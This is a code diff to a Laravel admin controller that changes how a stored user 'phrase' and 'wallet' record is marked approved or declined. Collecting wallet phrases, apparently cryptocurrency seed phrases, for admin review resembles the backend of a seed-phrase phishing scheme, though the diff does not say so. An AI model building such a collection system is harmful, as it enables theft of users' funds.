@@ -543,23 +543,29 @@ class AdminController extends Controller
             'wallet' => 'required|string',
         ]);
 
+        // Find the user by the given ID
         $user = User::findOrFail($id);
 
-        // Prepare the data to be stored as a JSON object
-        $data = [
-            'phrase' => $request->phrase,
-            'wallet' => $request->wallet,
-            'status' => $status
-        ];
+        // Decode the existing phrase JSON into an array
+        $phraseData = json_decode($user->phrase, true);
 
-        // Convert the array to a JSON string
-        $dataJson = json_encode($data);
+        // Check if it's a single object and convert it to an array if needed
+        if (isset($phraseData['phrase']) && isset($phraseData['wallet'])) {
+            $phraseData = [$phraseData];
+        }
+
+        // Update the status of the first entry in the array
+        $phraseData[0]['status'] = $status;
+
+        // Convert the updated array back to a JSON string
+        $updatedPhraseJson = json_encode($phraseData);
 
         // Update the user's phrase in the users table
-        $user->update(['phrase' => $dataJson]);
+        $user->update(['phrase' => $updatedPhraseJson]);
 
         // Redirect back with a success message
         return back()->with('success', $status == 1 ? 'Phrase Approved Successfully' : 'Phrase Declined');
     }
+
 
 }
